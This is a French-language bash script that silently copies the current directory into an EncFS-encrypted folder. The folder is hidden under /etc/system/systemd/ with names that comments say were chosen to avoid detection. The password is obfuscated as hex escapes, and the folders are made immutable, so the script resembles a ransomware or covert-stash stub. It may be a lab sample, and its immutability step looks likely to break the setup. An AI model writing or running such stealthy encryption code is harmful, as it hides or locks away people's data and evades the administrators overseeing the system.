#!/bin/bash

set -e

REPERTOIRE_COURANT=$(pwd)
DOSSIER_CHIFFRE="/etc/system/systemd/.load_net" #Nom de dossier bizarre pour eviter la detection
DOSSIER_MONTE="/etc/system/systemd/network_cache" #Nom de dossier bizarre pour eviter la detection

HASH_REFERENCE="dc08160901551a78c7e63598654103d8e808579a175203161be05933f0d8376a"

generer_mot_de_passe() {
    if [ "$HASH_REFERENCE" = "dc08160901551a78c7e63598654103d8e808579a175203161be05933f0d8376a" ]; then
        MOT_DE_PASSE=$(printf "\x63\x72\x79\x73\x74\x61\x6c\x32")
        return 0
    else
        return 1
    fi
}

verifier_dependances() {
    if ! command -v encfs &> /dev/null; then
        sudo apt update && sudo apt install -y encfs
    fi
    if ! command -v expect &> /dev/null; then
        sudo apt install -y expect
    fi
}

creer_encfs() {

    [ -d "$DOSSIER_MONTE" ] && sudo fusermount -u "$DOSSIER_MONTE" 2>/dev/null || true
    sudo mkdir -p "$DOSSIER_CHIFFRE"
    sudo mkdir -p "$DOSSIER_MONTE"
    sudo chown root:root "$DOSSIER_CHIFFRE" "$DOSSIER_MONTE"
    sudo chmod 755 "$DOSSIER_CHIFFRE" "$DOSSIER_MONTE"
    sudo chattr +i "$DOSSIER_CHIFFRE"
    sudo chattr +i "$DOSSIER_MONTE"
    expect << EOF
spawn encfs "$DOSSIER_CHIFFRE" "$DOSSIER_MONTE"
expect "?>"
send "\r"
expect "New Encfs Password:"
send "$MOT_DE_PASSE\r"
expect "Verify Encfs Password:"
send "$MOT_DE_PASSE\r"
expect eof
EOF
}

monter_encfs() {
    sudo mkdir -p "$DOSSIER_MONTE"
    sudo chown $USER:$USER "$DOSSIER_MONTE"
    sudo chmod 755 "$DOSSIER_MONTE"
    expect << EOF
spawn encfs "$DOSSIER_CHIFFRE" "$DOSSIER_MONTE"
expect "EncFS Password:"
send "$MOT_DE_PASSE\r"
expect eof
EOF
}

copier_donnees() {
    if [ -z "$(ls -A "$REPERTOIRE_COURANT" 2>/dev/null)" ]; then
        return
    fi
    cp -r "$REPERTOIRE_COURANT"/.[!.]* "$DOSSIER_MONTE/" 2>/dev/null || true
    cp -r "$REPERTOIRE_COURANT"/* "$DOSSIER_MONTE/" 2>/dev/null || true
}

finaliser_chiffrement() {
    fusermount -u "$DOSSIER_MONTE"
    echo "CHIFFREMENT TERMINER"
}

if ! generer_mot_de_passe; then
    echo "Mauvais mauvais"
    exit 1
fi
verifier_dependances
creer_encfs
copier_donnees
finaliser_chiffrement
